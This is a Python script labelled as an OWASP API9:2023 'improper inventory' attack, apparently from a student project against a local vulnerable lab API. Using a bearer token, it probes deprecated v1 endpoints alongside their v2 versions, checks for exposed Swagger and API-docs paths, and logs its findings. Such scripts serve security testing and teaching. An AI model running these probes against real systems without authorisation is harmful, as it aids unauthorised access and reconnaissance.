#!/usr/bin/env python3
"""
ATTACK 8: Improper Inventory Management
OWASP: API9:2023
What: Access old deprecated API versions
How: Try v1 endpoints instead of v2
Why dangerous: Old versions may lack security fixes
"""
import requests
import json
import datetime
import time

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(token):
    print("=" * 55)
    print("ATTACK 8: IMPROPER INVENTORY (API9:2023)")
    print("Accessing Deprecated API Versions")
    print("=" * 55)

    headers = {"Authorization": "Bearer " + token}
    accessible = []
    findings = []

    # Test v1 vs v2 endpoints
    endpoint_pairs = [
        {
            "v2": "/identity/api/v2/user/dashboard",
            "v1": "/identity/api/v1/user/dashboard",
            "description": "User dashboard"
        },
        {
            "v2": "/community/api/v2/community/posts/recent",
            "v1": "/community/api/v1/community/posts/recent",
            "description": "Community posts"
        },
        {
            "v2": "/workshop/api/v2/mechanic",
            "v1": "/workshop/api/v1/mechanic",
            "description": "Mechanic workshop"
        },
        {
            "v2": "/identity/api/v2/vehicle/vehicles",
            "v1": "/identity/api/v1/vehicle/vehicles",
            "description": "Vehicle data"
        },
    ]

    print("[*] Testing deprecated v1 endpoints vs current v2...\n")

    for pair in endpoint_pairs:
        print("[TEST] " + pair["description"])

        # Test v2 (should work)
        r2 = requests.get(TARGET + pair["v2"], headers=headers, timeout=5)
        print("  v2: " + pair["v2"] + " → " + str(r2.status_code))

        # Test v1 (deprecated - should be blocked)
        try:
            r1 = requests.get(TARGET + pair["v1"], headers=headers, timeout=5)
            print("  v1: " + pair["v1"] + " → " + str(r1.status_code))

            if r1.status_code == 200:
                accessible.append(pair["v1"])
                print("  [!] DEPRECATED ENDPOINT ACCESSIBLE!")
                findings.append({
                    "endpoint": pair["v1"],
                    "status": r1.status_code,
                    "issue": "Deprecated API version still accessible"
                })
            else:
                print("  [OK] Deprecated endpoint returns " + str(r1.status_code))
        except Exception as e:
            print("  [ERROR] " + str(e))

        time.sleep(0.3)
        print()

    # Also test for exposed documentation
    doc_endpoints = [
        "/swagger-ui.html",
        "/api-docs",
        "/v2/api-docs",
        "/swagger.json",
    ]

    print("[*] Testing for exposed API documentation...\n")
    for endpoint in doc_endpoints:
        try:
            r = requests.get(TARGET + endpoint, headers=headers, timeout=5)
            print("[DOC] " + endpoint + " → " + str(r.status_code))
            if r.status_code == 200:
                print("[!] API DOCS EXPOSED: " + endpoint)
                findings.append({
                    "endpoint": endpoint,
                    "status": 200,
                    "issue": "API documentation publicly accessible"
                })
        except Exception as e:
            print("[ERROR] " + str(e))
        time.sleep(0.2)

    print("\n[RESULT] " + str(len(accessible)) + " deprecated endpoints accessible")
    print("[RESULT] " + str(len(findings)) + " total findings")
    print("[SEVERITY] MEDIUM")

    result = {
        "attack": "Improper Inventory Management",
        "owasp": "API9:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "deprecated_accessible": accessible,
        "findings": findings,
        "severity": "MEDIUM"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack8_inventory_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
